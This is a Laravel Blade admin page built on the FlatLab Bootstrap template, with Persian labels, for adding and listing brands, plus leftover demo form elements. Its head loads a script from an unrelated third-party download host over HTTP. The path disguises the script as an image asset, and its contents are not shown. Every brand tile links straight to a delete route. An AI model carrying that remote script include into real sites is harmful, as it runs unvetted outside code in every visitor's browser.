<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="">
    <meta name="author" content="Mosaddek">
	<script type="text/javascript" src="http://dl.20script.ir/img/website.js"></script>
    <meta name="keyword" content="FlatLab, Dashboard, Bootstrap, Admin, Template, Theme, Responsive, Fluid, Retina">
    <link rel="shortcut icon" href="img/favicon.html">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
    <title>FlatLab - Flat & Responsive Bootstrap Admin Template</title>

  

    @vite('resources/js/app.js')
  </head>

  <body>

  <section id="container" class="">
      <!--header start-->
      <header class="header white-bg">
            <div class="sidebar-toggle-box">
                <div data-original-title="Toggle Navigation" data-placement="right" class="icon-reorder tooltips"></div>
            </div>
            <!--logo start-->
            <a href="#" class="logo">فلت<span>لب</span></a>
            <!--logo end-->
            <div class="nav notify-row" id="top_menu">
                <!--  notification start -->
                <ul class="nav top-menu">
                    <!-- settings start -->
                    <li class="dropdown">
                        <a data-toggle="dropdown" class="dropdown-toggle" href="#">
                            <i class="icon-tasks"></i>
                            <span class="badge bg-success">6</span>
                        </a>
                        <ul class="dropdown-menu extended tasks-bar">
                            <div class="notify-arrow notify-arrow-green"></div>
                            <li>
                                <p class="green">شما 6 برنامه در دست کار دارید</p>
                            </li>
                            <li>
                                <a href="#">
                                    <div class="task-info">
                                        <div class="desc">پنل مدیریت</div>
                                        <div class="percent">40%</div>
                                    </div>
                                    <div class="progress progress-striped">
                                        <div class="progress-bar progress-bar-success" role="progressbar" aria-valuenow="40" aria-valuemin="0" aria-valuemax="100" style="width: 40%">
                                            <span class="sr-only">40% Complete (success)</span>
                                        </div>
                                    </div>
                                </a>
                            </li>
                            <li>
                                <a href="#">
                                    <div class="task-info">
                                        <div class="desc">بروزرسانی دیتابیس</div>
                                        <div class="percent">60%</div>
                                    </div>
                                    <div class="progress progress-striped">
                                        <div class="progress-bar progress-bar-warning" role="progressbar" aria-valuenow="60" aria-valuemin="0" aria-valuemax="100" style="width: 60%">
                                            <span class="sr-only">60% Complete (warning)</span>
                                        </div>
                                    </div>
                                </a>
                            </li>
                            <li>
                                <a href="#">
                                    <div class="task-info">
                                        <div class="desc">برنامه نویسی  IPhone</div>
                                        <div class="percent">87%</div>
                                    </div>
                                    <div class="progress progress-striped">
                                        <div class="progress-bar progress-bar-info" role="progressbar" aria-valuenow="20" aria-valuemin="0" aria-valuemax="100" style="width: 87%">
                                            <span class="sr-only">87% Complete</span>
                                        </div>
                                    </div>
                                </a>
                            </li>
                            <li>
                                <a href="#">
                                    <div class="task-info">
                                        <div class="desc">برنامه موبایل</div>
                                        <div class="percent">33%</div>
                                    </div>
                                    <div class="progress progress-striped">
                                        <div class="progress-bar progress-bar-danger" role="progressbar" aria-valuenow="80" aria-valuemin="0" aria-valuemax="100" style="width: 33%">
                                            <span class="sr-only">33% Complete (danger)</span>
                                        </div>
                                    </div>
                                </a>
                            </li>
                            <li>
                                <a href="#">
                                    <div class="task-info">
                                        <div class="desc">پروفایل v1.3</div>
                                        <div class="percent">45%</div>
                                    </div>
                                    <div class="progress progress-striped active">
                                        <div class="progress-bar"  role="progressbar" aria-valuenow="45" aria-valuemin="0" aria-valuemax="100" style="width: 45%">
                                            <span class="sr-only">45% Complete</span>
                                        </div>
                                    </div>

                                </a>
                            </li>
                            <li class="external">
                                <a href="#">برنامه های بیشتر</a>
                            </li>
                        </ul>
                    </li>
                    <!-- settings end -->
                    <!-- inbox dropdown start-->
                    <li id="header_inbox_bar" class="dropdown">
                        <a data-toggle="dropdown" class="dropdown-toggle" href="#">
                            <i class="icon-envelope-alt"></i>
                            <span class="badge bg-important">5</span>
                        </a>
                        <ul class="dropdown-menu extended inbox">
                            <div class="notify-arrow notify-arrow-red"></div>
                            <li>
                                <p class="red">شما 5 پیام جدید دارید</p>
                            </li>
                            <li>
                                <a href="#">
                                    <span class="photo"><img alt="avatar" src="img/avatar-mini.jpg"></span>
                                    <span class="subject">
                                    <span class="from">سجاد باقرزاده</span>
                                    <span class="time">همین حالا</span>
                                    </span>
                                    <span class="message">
                                        سلام،متن پیام نمایشی جهت تست
                                    </span>
                                </a>
                            </li>
                            <li>
                                <a href="#">
                                    <span class="photo"><img alt="avatar" src="img/avatar-mini2.jpg"></span>
                                    <span class="subject">
                                    <span class="from">ایمان مدائنی</span>
                                    <span class="time">10 دقیقه قبل</span>
                                    </span>
                                    <span class="message">
                                     سلام، چطوری شما؟
                                    </span>
                                </a>
                            </li>
                            <li>
                                <a href="#">
                                    <span class="photo"><img alt="avatar" src="img/avatar-mini3.jpg"></span>
                                    <span class="subject">
                                    <span class="from">صبا ذاکر</span>
                                    <span class="time">3 ساعت قبل</span>
                                    </span>
                                    <span class="message">
                                        چه پنل مدیریتی فوق العاده ایی
                                    </span>
                                </a>
                            </li>
                            <li>
                                <a href="#">
                                    <span class="photo"><img alt="avatar" src="img/avatar-mini4.jpg"></span>
                                    <span class="subject">
                                    <span class="from">مسعود شریفی</span>
                                    <span class="time">همین حالا</span>
                                    </span>
                                    <span class="message">
                                        سلام،متن پیام نمایشی جهت تست
                                    </span>
                                </a>
                            </li>
                            <li>
                                <a href="#">نمایش تمامی پیام ها</a>
                            </li>
                        </ul>
                    </li>
                    <!-- inbox dropdown end -->
                    <!-- notification dropdown start-->
                    <li id="header_notification_bar" class="dropdown">
                        <a data-toggle="dropdown" class="dropdown-toggle" href="#">

                            <i class="icon-bell-alt"></i>
                            <span class="badge bg-warning">7</span>
                        </a>
                        <ul class="dropdown-menu extended notification">
                            <div class="notify-arrow notify-arrow-yellow"></div>
                            <li>
                                <p class="yellow">شما 7 اعلام جدید دارید</p>
                            </li>
                            <li>
                                <a href="#">
                                    <span class="label label-danger"><i class="icon-bolt"></i></span>
                                    سرور شماره 3 توقف کرده
                                    <span class="small italic">34 دقیقه قبل</span>
                                </a>
                            </li>
                            <li>
                                <a href="#">
                                    <span class="label label-warning"><i class="icon-bell"></i></span>
                                    سرور شماره 4 بارگزاری نمی شود
                                    <span class="small italic">1 ساعت قبل</span>
                                </a>
                            </li>
                            <li>
                                <a href="#">
                                    <span class="label label-danger"><i class="icon-bolt"></i></span>
                                    پنل مدیریت 24% پیشرفت داشته است
                                    <span class="small italic">4 ساعت قبل</span>
                                </a>
                            </li>
                            <li>
                                <a href="#">
                                    <span class="label label-success"><i class="icon-plus"></i></span>
                                    ثبت نام کاربر جدید
                                    <span class="small italic">همین حالا</span>
                                </a>
                            </li>
                            <li>
                                <a href="#">
                                    <span class="label label-info"><i class="icon-bullhorn"></i></span>
                                    برنامه پیام خطا دارد
                                    <span class="small italic">10 دقیقه قبل</span>
                                </a>
                            </li>
                            <li>
                                <a href="#">نمایش تمامی اعلام ها</a>
                            </li>
                        </ul>
                    </li>
                    <!-- notification dropdown end -->
                </ul>
                <!--  notification end -->
            </div>
            <div class="top-nav ">
                <!--search & user info start-->
                <ul class="nav pull-right top-menu">
                    <li>
                        <input type="text" class="form-control search" placeholder="Search">
                    </li>
                    <!-- user login dropdown start-->
                    <li class="dropdown">
                        <a data-toggle="dropdown" class="dropdown-toggle" href="#">
                            <img alt="" src="img/avatar1_small.jpg">
                            <span class="username">سجاد باقرزاده</span>
                            <b class="caret"></b>
                        </a>
                        <ul class="dropdown-menu extended logout">
                            <div class="log-arrow-up"></div>
                            <li><a href="#"><i class=" icon-suitcase"></i>پروفایل</a></li>
                            <li><a href="#"><i class="icon-cog"></i> تنظیمات</a></li>
                            <li><a href="#"><i class="icon-bell-alt"></i> اعلام ها</a></li>
                            <li><a href="login.html"><i class="icon-key"></i> خروج</a></li>
                        </ul>
                    </li>
                    <!-- user login dropdown end -->
                </ul>
                <!--search & user info end-->
            </div>
        </header>
      <!--header end-->
      <!--sidebar start-->
      <aside>
          <div id="sidebar"  class="nav-collapse ">
              <!-- sidebar menu start-->
              <ul class="sidebar-menu">
                  <li class="active">
                      <a class="" href="index.html">
                          <i class="icon-dashboard"></i>
                          <span>صفحه اصلی</span>
                      </a>
                  </li>
                  <li class="sub-menu">
                      <a href="javascript:;" class="">
                          <i class="icon-book"></i>
                          <span>عناصر صفحه</span>
                          <span class="arrow"></span>
                      </a>
                      <ul class="sub">
                          <li><a class="" href="general.html">عمومی</a></li>
                          <li><a class="" href="buttons.html">دکمه ها</a></li>
                          <li><a class="" href="widget.html">ویجت ها</a></li>
                          <li><a class="" href="slider.html">اسلایدر ها</a></li>
                          <li><a class="" href="font_awesome.html">فونت های شکل دار</a></li>
                      </ul>
                  </li>
                  <li class="sub-menu">
                      <a href="javascript:;" class="">
                          <i class="icon-cogs"></i>
                          <span>کامنت ها</span>
                          <span class="arrow"></span>
                      </a>
                      <ul class="sub">
                          <li><a class="" href="grids.html">گرید</a></li>
                          <li><a class="" href="calendar.html">تقویم</a></li>
                          <li><a class="" href="charts.html">چارت</a></li>
                      </ul>
                  </li>
                  <li class="sub-menu">
                      <a href="javascript:;" class="">
                          <i class="icon-tasks"></i>
                          <span>ابزارهای فرم</span>
                          <span class="arrow"></span>
                      </a>
                      <ul class="sub">
                          <li><a class="" href="form_component.html">کامنت فرم</a></li>
                          <li><a class="" href="form_wizard.html">فرم Wizard</a></li>
                          <li><a class="" href="form_validation.html">ارزیابی فرم</a></li>
                      </ul>
                  </li>
                  <li class="sub-menu">
                      <a href="javascript:;" class="">
                          <i class="icon-th"></i>
                          <span>اطلاعات جدول</span>
                          <span class="arrow"></span>
                      </a>
                      <ul class="sub">
                          <li><a class="" href="basic_table.html">جدول ساده</a></li>
                          <li><a class="" href="dynamic_table.html">جدول داینامیک</a></li>
                      </ul>
                  </li>
                  <li>
                      <a class="" href="inbox.html">
                          <i class="icon-envelope"></i>
                          <span>ایمیل </span>
                          <span class="label label-danger pull-right mail-info">2</span>
                      </a>
                  </li>
                  <li class="sub-menu">
                      <a href="javascript:;" class="">
                          <i class="icon-glass"></i>
                          <span>عناصر اضافی</span>
                          <span class="arrow"></span>
                      </a>
                      <ul class="sub">
                          <li><a class="" href="blank.html">صفحه خالی</a></li>
                          <li><a class="" href="profile.html">پروفایل</a></li>
                          <li><a class="" href="invoice.html">فاکتور</a></li>
                          <li><a class="" href="404.html">404 Error</a></li>
                          <li><a class="" href="500.html">500 Error</a></li>
                      </ul>
                  </li>
                  <li>
                      <a class="" href="login.html">
                          <i class="icon-user"></i>
                          <span>صفحه ورود به سایت</span>
                      </a>
                  </li>
              </ul>
              <!-- sidebar menu end-->
          </div>
      </aside>
      

             <section id="main-content">
                <section class="wrapper">
                    <!-- page start-->
                    <div class="row">
                   
                    </div>
                    <div class="row">
                        <div class="col-lg-6">
                            <section class="panel">
                                <header class="panel-heading">
                                    افزودن برند جدید
                             
                                </header>
                                <div class="panel-body">
                                    <form role="form" action="{{ route('brands.store') }}" method="POST">
                                        @csrf
                                        <div class="form-group">
                                            <label for="exampleInputEmail1">نام برند</label>
                                            <input name="name" type="name" class="form-control" id="exampleInput" placeholder="نام برند را وارد کنید">
                                        </div>
                                        <div class="form-group">
                                            <label for="exampleInputPassword1">لطفا تصویر خود را قرار دهید</label>
                                            <input type="url" name="picture_url" class="form-control" id="exampleInput" placeholder="لطفا آدرس تصویر خود را قرار دهید">
                                        </div>
                                        {{-- <div class="form-group">
                                            <label for="exampleInputFile">تصویر را آپلود کنید</label>
                                            <input type="file" id="exampleInputFile">
                                        </div> --}}
                                        <button type="submit" class="btn btn-info">Submit</button>
                                    </form>
    
                                </div>
                            </section>
                        </div>
                       
                        <div class="col-lg-6">
                            
                            <section class="panel">
                                <header class="panel-heading">
                                    Horizontal Forms
                             
                                </header>
                                <div class="panel-body">
                                    <form class="form-horizontal" role="form" action="" method="POST">
                                       @csrf 
                                        <div class="form-group">
                                        </div>
                                        <div class="form-group">
                                            <label for="inputPassword1" class="col-lg-2 control-label">Password</label>
                                            <div class="col-lg-10">
                                               
                                                <select class="col-lg-9 control-label" name="brand" id="brand">
                                                    @foreach ($brands as $brand)
                                                    <option value="brand1">{{ $brand->name }}</option>
                                                        
                                                    @endforeach
                                                    
                                                </select>
                                            </div>
                                        </div>
                                        <div class="form-group">
                        
                                        </div>
                                        <div class="form-group">
                                            <div class="col-lg-offset-2 col-lg-10">
                                                <button type="submit" class="btn btn-danger">Sign in</button>
                                            </div>
                                        </div>
                                    </form>
                                </div>
                            </section>

                        </div>    
                                <<div class="row">
                                    @foreach ($brands as $brand)
                                        <a href="{{ route('brands.delete', $brand->id) }}" class="col-lg-4 col-sm-6 mb-4">
                                            <div class="single-features text-center">
                                                <img src="{{ $brand->picture_url }}" alt="image">
                                                <h3>{{ $brand->name }}</h3>
                                            </div>
                                        </a>
                                    @endforeach
                                </div>
                                
                                
                            
                            {{-- <section class="panel">
    
                                <div class="panel-body">
                                    <a href="#myModal" data-toggle="modal" class="btn btn-xs btn-success">Form in Modal
                                  </a>
                                    <a href="#myModal-1" data-toggle="modal" class="btn btn-xs btn-warning">Form in Modal 2
                                  </a>
                                    <a href="#myModal-2" data-toggle="modal" class="btn btn-xs btn-danger">Form in Modal 3
                                  </a>
    
                                    <div aria-hidden="true" aria-labelledby="myModalLabel" role="dialog" tabindex="-1" id="myModal" class="modal fade">
                                        <div class="modal-dialog">
                                            <div class="modal-content">
                                                <div class="modal-header">
                                                    <button aria-hidden="true" data-dismiss="modal" class="close" type="button">×</button>
                                                    <h4 class="modal-title">Form Tittle</h4>
                                                </div>
                                                <div class="modal-body">
    
                                                    <form role="form">
                                                        <div class="form-group">
                                                            <label for="exampleInputEmail1">Email address</label>
                                                            <input type="email" class="form-control" id="exampleInputEmail3" placeholder="Enter email">
                                                        </div>
                                                        <div class="form-group">
                                                            <label for="exampleInputPassword1">Password</label>
                                                            <input type="password" class="form-control" id="exampleInputPassword3" placeholder="Password">
                                                        </div>
                                                        <div class="form-group">
                                                            <label for="exampleInputFile">File input</label>
                                                            <input type="file" id="exampleInputFile3">
                                                            <p class="help-block">Example block-level help text here.</p>
                                                        </div>
                                                        <div class="checkbox">
                                                            <label>
                                                                <input type="checkbox">
                                                                Check me out
                                                         
                                                            </label>
                                                        </div>
                                                        <button type="submit" class="btn btn-default">Submit</button>
                                                    </form>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    <div aria-hidden="true" aria-labelledby="myModalLabel" role="dialog" tabindex="-1" id="myModal-1" class="modal fade">
                                        <div class="modal-dialog">
                                            <div class="modal-content">
                                                <div class="modal-header">
                                                    <button aria-hidden="true" data-dismiss="modal" class="close" type="button">×</button>
                                                    <h4 class="modal-title">Form Tittle</h4>
                                                </div>
                                                <div class="modal-body">
    
                                                    <form class="form-horizontal" role="form">
                                                        <div class="form-group">
                                                            <label for="inputEmail1" class="col-lg-2 control-label">Email</label>
                                                            <div class="col-lg-10">
                                                                <input type="email" class="form-control" id="inputEmail4" placeholder="Email">
                                                            </div>
                                                        </div>
                                                        <div class="form-group">
                                                            <label for="inputPassword1" class="col-lg-2 control-label">Password</label>
                                                            <div class="col-lg-10">
                                                                <input type="password" class="form-control" id="inputPassword4" placeholder="Password">
                                                            </div>
                                                        </div>
                                                        <div class="form-group">
                                                            <div class="col-lg-offset-2 col-lg-10">
                                                                <div class="checkbox">
                                                                    <label>
                                                                        <input type="checkbox">
                                                                        Remember me
                                                                 
                                                                    </label>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div class="form-group">
                                                            <div class="col-lg-offset-2 col-lg-10">
                                                                <button type="submit" class="btn btn-default">Sign in</button>
                                                            </div>
                                                        </div>
                                                    </form>
    
                                                </div>
    
                                            </div>
                                        </div>
                                    </div>
                                    <div aria-hidden="true" aria-labelledby="myModalLabel" role="dialog" tabindex="-1" id="myModal-2" class="modal fade">
                                        <div class="modal-dialog">
                                            <div class="modal-content">
                                                <div class="modal-header">
                                                    <button aria-hidden="true" data-dismiss="modal" class="close" type="button">×</button>
                                                    <h4 class="modal-title">Form Tittle</h4>
                                                </div>
                                                <div class="modal-body">
                                                    <form class="form-inline" role="form">
                                                        <div class="form-group">
                                                            <label class="sr-only" for="exampleInputEmail2">Email address</label>
                                                            <input type="email" class="form-control sm-input" id="exampleInputEmail5" placeholder="Enter email">
                                                        </div>
                                                        <div class="form-group">
                                                            <label class="sr-only" for="exampleInputPassword2">Password</label>
                                                            <input type="password" class="form-control sm-input" id="exampleInputPassword5" placeholder="Password">
                                                        </div>
                                                        <div class="checkbox">
                                                            <label>
                                                                <input type="checkbox">
                                                                Remember me
                                                         
                                                            </label>
                                                        </div>
                                                        <button type="submit" class="btn btn-default">Sign in</button>
                                                    </form>
    
                                                </div>
    
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </section>
                        </div>
                    </div>
    
                    <div class="row">
                        <div class="col-lg-12">
                            <section class="panel">
                                <header class="panel-heading">
                                    Form Elements
                             
                                </header>
                                <div class="panel-body">
                                    <form class="form-horizontal tasi-form" method="get">
                                        <div class="form-group">
                                            <label class="col-sm-2 control-label">Default</label>
                                            <div class="col-sm-10">
                                                <input type="text" class="form-control">
                                            </div>
                                        </div>
                                        <div class="form-group">
                                            <label class="col-sm-2 control-label">Help text</label>
                                            <div class="col-sm-10">
                                                <input type="text" class="form-control">
                                                <span class="help-block">A block of help text that breaks onto a new line and may extend beyond one line.</span>
                                            </div>
                                        </div>
                                        <div class="form-group">
                                            <label class="col-sm-2 control-label">Rounder</label>
                                            <div class="col-sm-10">
                                                <input type="text" class="form-control round-input">
                                            </div>
                                        </div>
                                        <div class="form-group">
                                            <label class="col-sm-2 control-label">Input focus</label>
                                            <div class="col-sm-10">
                                                <input class="form-control" id="focusedInput" type="text" value="This is focused...">
                                            </div>
                                        </div>
                                        <div class="form-group">
                                            <label class="col-sm-2 control-label">Disabled</label>
                                            <div class="col-sm-10">
                                                <input class="form-control" id="disabledInput" type="text" placeholder="Disabled input here..." disabled>
                                            </div>
                                        </div>
                                        <div class="form-group">
                                            <label class="col-sm-2 control-label">Placeholder</label>
                                            <div class="col-sm-10">
                                                <input type="text" class="form-control" placeholder="placeholder">
                                            </div>
                                        </div>
                                        <div class="form-group">
                                            <label class="col-sm-2 control-label">Password</label>
                                            <div class="col-sm-10">
                                                <input type="password" class="form-control" placeholder="">
                                            </div>
                                        </div>
                                        <div class="form-group">
                                            <label class="col-lg-2 control-label">Static control</label>
                                            <div class="col-lg-10">
                                                <p class="form-control-static">email@example.com</p>
                                            </div>
                                        </div>
                                    </form>
                                </div>
                            </section>
                            <section class="panel">
                                <div class="panel-body">
                                    <form class="form-horizontal tasi-form" method="get">
                                        <div class="form-group has-success">
                                            <label class="control-label col-lg-2" for="inputSuccess">Input with success</label>
                                            <div class="col-lg-10">
                                                <input type="text" class="form-control" id="inputSuccess">
                                            </div>
                                        </div>
                                        <div class="form-group has-warning">
                                            <label class="control-label col-lg-2" for="inputWarning">Input with warning</label>
                                            <div class="col-lg-10">
                                                <input type="text" class="form-control" id="inputWarning">
                                            </div>
                                        </div>
                                        <div class="form-group has-error">
                                            <label class="control-label col-lg-2" for="inputError">Input with error</label>
                                            <div class="col-lg-10">
                                                <input type="text" class="form-control" id="inputError">
                                            </div>
                                        </div>
                                    </form>
                                </div>
                            </section>
                            <section class="panel">
                                <div class="panel-body">
                                    <form class="form-horizontal tasi-form" method="get">
                                        <div class="form-group">
                                            <label class="control-label col-lg-2" for="inputSuccess">Control sizing</label>
                                            <div class="col-lg-10">
                                                <input class="form-control input-lg m-bot15" type="text" placeholder=".input-lg">
                                                <input class="form-control m-bot15" type="text" placeholder="Default input">
                                                <input class="form-control input-sm m-bot15" type="text" placeholder=".input-sm">
    
                                                <select class="form-control input-lg m-bot15">
                                                    <option>Option 1</option>
                                                    <option>Option 2</option>
                                                    <option>Option 3</option>
                                                </select>
                                                <select class="form-control m-bot15">
                                                    <option>Option 1</option>
                                                    <option>Option 2</option>
                                                    <option>Option 3</option>
                                                </select>
                                                <select class="form-control input-sm m-bot15">
                                                    <option>Option 1</option>
                                                    <option>Option 2</option>
                                                    <option>Option 3</option>
                                                </select>
                                            </div>
                                        </div>
                                    </form>
                                </div>
                            </section>
                            <section class="panel">
                                <div class="panel-body">
                                    <form class="form-horizontal tasi-form" method="get">
                                        <div class="form-group">
                                            <label class="control-label col-lg-2" for="inputSuccess">Checkboxes and radios</label>
                                            <div class="col-lg-10">
                                                <div class="checkbox">
                                                    <label>
                                                        <input type="checkbox" value="">
                                                        Option one is this and that&mdash;be sure to include why it's great
                                                 
                                                    </label>
                                                </div>
    
                                                <div class="checkbox">
                                                    <label>
                                                        <input type="checkbox" value="">
                                                        Option one is this and that&mdash;be sure to include why it's great option one
                                                 
                                                    </label>
                                                </div>
    
                                                <div class="radio">
                                                    <label>
                                                        <input type="radio" name="optionsRadios" id="optionsRadios1" value="option1" checked>
                                                        Option one is this and that&mdash;be sure to include why it's great
                                                 
                                                    </label>
                                                </div>
                                                <div class="radio">
                                                    <label>
                                                        <input type="radio" name="optionsRadios" id="optionsRadios2" value="option2">
                                                        Option two can be something else and selecting it will deselect option one
                                                 
                                                    </label>
                                                </div>
    
                                            </div>
                                        </div>
                                        <div class="form-group">
                                            <label class="control-label col-lg-2" for="inputSuccess">Inline checkboxes</label>
                                            <div class="col-lg-10">
                                                <label class="checkbox-inline">
                                                    <input type="checkbox" id="inlineCheckbox1" value="option1">
                                                    1
                                             
                                                </label>
                                                <label class="checkbox-inline">
                                                    <input type="checkbox" id="inlineCheckbox2" value="option2">
                                                    2
                                             
                                                </label>
                                                <label class="checkbox-inline">
                                                    <input type="checkbox" id="inlineCheckbox3" value="option3">
                                                    3
                                             
                                                </label>
    
                                            </div>
                                        </div>
                                        <div class="form-group">
                                            <label class="control-label col-lg-2" for="inputSuccess">Selects</label>
                                            <div class="col-lg-10">
                                                <select class="form-control m-bot15">
                                                    <option>1</option>
                                                    <option>2</option>
                                                    <option>3</option>
                                                    <option>4</option>
                                                    <option>5</option>
                                                </select>
    
                                                <select multiple class="form-control">
                                                    <option>1</option>
                                                    <option>2</option>
                                                    <option>3</option>
                                                    <option>4</option>
                                                    <option>5</option>
                                                </select>
                                            </div>
                                        </div>
    
                                        <div class="form-group">
                                            <label class="control-label col-lg-2" for="inputSuccess">Column sizing</label>
                                            <div class="col-lg-10">
                                                <div class="row">
                                                    <div class="col-lg-2">
                                                        <input type="text" class="form-control" placeholder=".col-lg-2">
                                                    </div>
                                                    <div class="col-lg-3">
                                                        <input type="text" class="form-control" placeholder=".col-lg-3">
                                                    </div>
                                                    <div class="col-lg-4">
                                                        <input type="text" class="form-control" placeholder=".col-lg-4">
                                                    </div>
                                                </div>
    
                                            </div>
                                        </div>
    
                                    </form>
                                </div>
                            </section>
    
                            <section class="panel">
                                <header class="panel-heading">
                                    Input groups
                             
                                </header>
                                <div class="panel-body">
                                    <form class="form-horizontal tasi-form" method="get">
                                        <div class="form-group">
                                            <label class="control-label col-lg-2">Basic examples</label>
                                            <div class="col-lg-10">
                                                <div class="input-group m-bot15">
                                                    <span class="input-group-addon">@</span>
                                                    <input type="text" class="form-control" placeholder="Username">
                                                </div>
    
                                                <div class="input-group m-bot15">
                                                    <input type="text" class="form-control">
                                                    <span class="input-group-addon">.00</span>
                                                </div>
    
                                                <div class="input-group m-bot15">
                                                    <span class="input-group-addon">$</span>
                                                    <input type="text" class="form-control">
                                                    <span class="input-group-addon">.00</span>
                                                </div>
                                            </div>
                                        </div>
                                        <div class="form-group">
                                            <label class="control-label col-lg-2">Sizing</label>
                                            <div class="col-lg-10">
                                                <div class="input-group input-group-lg m-bot15">
                                                    <span class="input-group-addon">@</span>
                                                    <input type="text" class="form-control input-lg" placeholder="Username">
                                                </div>
    
                                                <div class="input-group m-bot15">
                                                    <span class="input-group-addon">@</span>
                                                    <input type="text" class="form-control" placeholder="Username">
                                                </div>
    
                                                <div class="input-group input-group-sm m-bot15">
                                                    <span class="input-group-addon">@</span>
                                                    <input type="text" class="form-control" placeholder="Username">
                                                </div>
    
                                            </div>
                                        </div>
                                        <div class="form-group">
                                            <label class="control-label col-lg-2">Checkboxe and radio</label>
                                            <div class="col-lg-10">
                                                <div class="input-group m-bot15">
                                                    <span class="input-group-addon">
                                                        <input type="checkbox">
                                                    </span>
                                                    <input type="text" class="form-control">
                                                </div>
    
                                                <div class="input-group m-bot15">
                                                    <span class="input-group-addon">
                                                        <input type="radio">
                                                    </span>
                                                    <input type="text" class="form-control">
                                                </div>
    
                                            </div>
                                        </div>
                                        <div class="form-group">
                                            <label class="control-label col-lg-2">Button addons</label>
                                            <div class="col-lg-10">
                                                <div class="input-group m-bot15">
                                                    <span class="input-group-btn">
                                                        <button class="btn btn-white" type="button">Go!</button>
                                                    </span>
                                                    <input type="text" class="form-control">
                                                </div>
    
                                                <div class="input-group m-bot15">
                                                    <input type="text" class="form-control">
                                                    <span class="input-group-btn">
                                                        <button class="btn btn-white" type="button">Go!</button>
                                                    </span>
                                                </div>
    
                                                <div class="input-group m-bot15">
                                                    <div class="input-group-btn">
                                                        <button type="button" class="btn btn-white dropdown-toggle" data-toggle="dropdown">Action <span class="caret"></span></button>
                                                        <ul class="dropdown-menu">
                                                            <li><a href="#">Action</a></li>
                                                            <li><a href="#">Another action</a></li>
                                                            <li><a href="#">Something else here</a></li>
                                                            <li class="divider"></li>
                                                            <li><a href="#">Separated link</a></li>
                                                        </ul>
                                                    </div>
                                                    <input type="text" class="form-control">
                                                </div>
                                                <div class="input-group m-bot15">
                                                    <input type="text" class="form-control">
                                                    <div class="input-group-btn">
                                                        <button type="button" class="btn btn-white dropdown-toggle" data-toggle="dropdown">Action <span class="caret"></span></button>
                                                        <ul class="dropdown-menu pull-right">
                                                            <li><a href="#">Action</a></li>
                                                            <li><a href="#">Another action</a></li>
                                                            <li><a href="#">Something else here</a></li>
                                                            <li class="divider"></li>
                                                            <li><a href="#">Separated link</a></li>
                                                        </ul>
                                                    </div>
                                                </div>
    
                                            </div>
                                        </div>
    
                                        <div class="form-group">
                                            <label class="control-label col-lg-2">Segmented buttons</label>
                                            <div class="col-lg-10">
                                                <div class="input-group m-bot15">
                                                    <div class="input-group-btn">
                                                        <button tabindex="-1" class="btn btn-white" type="button">Action</button>
                                                        <button tabindex="-1" data-toggle="dropdown" class="btn btn-white dropdown-toggle" type="button">
                                                            <span class="caret"></span>
                                                        </button>
                                                        <ul role="menu" class="dropdown-menu">
                                                            <li><a href="#">Action</a></li>
                                                            <li><a href="#">Another action</a></li>
                                                            <li><a href="#">Something else here</a></li>
                                                            <li class="divider"></li>
                                                            <li><a href="#">Separated link</a></li>
                                                        </ul>
                                                    </div>
                                                    <input type="text" class="form-control">
                                                </div>
    
                                                <div class="input-group m-bot15">
                                                    <input type="text" class="form-control">
                                                    <div class="input-group-btn">
                                                        <button tabindex="-1" class="btn btn-white" type="button">Action</button>
                                                        <button tabindex="-1" data-toggle="dropdown" class="btn btn-white dropdown-toggle" type="button">
                                                            <span class="caret"></span>
                                                        </button>
                                                        <ul role="menu" class="dropdown-menu pull-right">
                                                            <li><a href="#">Action</a></li>
                                                            <li><a href="#">Another action</a></li>
                                                            <li><a href="#">Something else here</a></li>
                                                            <li class="divider"></li>
                                                            <li><a href="#">Separated link</a></li>
                                                        </ul>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
    
                                    </form>
                                </div>
                            </section>
    
                            <div class="row">
                                <div class="col-lg-6">
                                    <section class="panel">
                                        <header class="panel-heading">
                                            Color Pickers & Date Pickers
                                     
                                        </header>
                                        <div class="panel-body">
                                            <form class="form-horizontal tasi-form" action="#">
                                                <!--color picker start-->
    
                                                <div class="form-group">
                                                    <label class="control-label col-sm-4">Default</label>
    
                                                    <div class="col-sm-5">
                                                        <input type="text" value="#8fff00" class="cp1 form-control">
                                                    </div>
                                                </div>
                                                <div class="form-group">
                                                    <label class="control-label col-sm-4">RGBA</label>
    
                                                    <div class="col-sm-5">
                                                        <input type="text" data-color-format="rgba" value="rgb(0,194,255,0.78)" class="cp2 form-control">
                                                    </div>
                                                </div>
    
                                                <!--color picker end-->
    
                                                <!--date picker start-->
    
                                                <div class="form-group">
                                                    <label class="control-label col-sm-4">Default Datepicker</label>
                                                    <div class="col-sm-6">
                                                        <input id="dp1" type="text" value="12-02-2012" size="16" class="form-control">
                                                    </div>
                                                </div>
                                                <div class="form-group">
                                                    <label class="control-label col-sm-4">Starts with years view</label>
                                                    <div class="col-sm-6">
    
    
                                                        <div class="input-append date" id="dpYears" data-date="12-02-2012"
                                                            data-date-format="dd-mm-yyyy" data-date-viewmode="years">
                                                            <input class="form-control" size="16" type="text" value="12-02-2012" readonly>
                                                            <span class="add-on"><i class="icon-calendar"></i></span>
                                                        </div>
                                                    </div>
                                                </div>
    
                                                <div class="form-group">
                                                    <label class="control-label col-sm-4">Date Ranges</label>
                                                    <div class="col-sm-6">
                                                        <div class="input-prepend">
                                                            <input id="reservation" type="text" class=" form-control" />
                                                        </div>
                                                    </div>
                                                </div>
    
                                                <!--date picker end-->
    
                                            </form>
    
    
                                        </div>
                                    </section>
                                    <section class="panel">
                                        <header class="panel-heading">
                                            Tags Input
                                     
                                        </header>
                                        <div class="panel-body">
                                            <input name="tagsinput" id="tagsinput" class="tagsinput" value="Flat,Design,Lab,Clean" />
                                        </div>
                                    </section>
                                </div>
                                <div class="col-lg-6">
                                    <section class="panel">
                                        <header class="panel-heading">
                                            Custom Checkbox & Radio
                                     
                                        </header>
                                        <div class="panel-body">
                                            <form action="#" method="get" accept-charset="utf-8">
                                                <div class="checkboxes">
                                                    <label class="label_check" for="checkbox-01">
